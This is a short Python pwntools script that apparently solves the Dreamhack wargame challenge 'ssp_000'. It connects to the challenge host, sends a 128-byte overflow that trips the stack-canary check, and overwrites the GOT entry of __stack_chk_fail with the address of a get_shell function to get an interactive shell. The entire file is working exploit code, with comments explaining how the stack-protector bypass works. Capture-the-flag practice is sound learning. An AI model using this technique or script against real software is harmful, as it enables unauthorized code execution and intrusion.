from pwn import *

e = ELF("./ssp_000")
p = remote("host3.dreamhack.games", 14259)


# make stack samsh happen
payload = b'A' * 0x80

p.send(payload)


# at the epilogue of main, stack smach is detected
# it will jump to __stack_chk_fail
# so overwrite __stack_chk_fail's GOT to get_shell's address

stack_smash = e.got["__stack_chk_fail"]
p.sendlineafter(b':', str(stack_smash).encode())

get_shell = e.symbols["get_shell"]
p.sendlineafter(b':', str(get_shell).encode())

p.interactive()

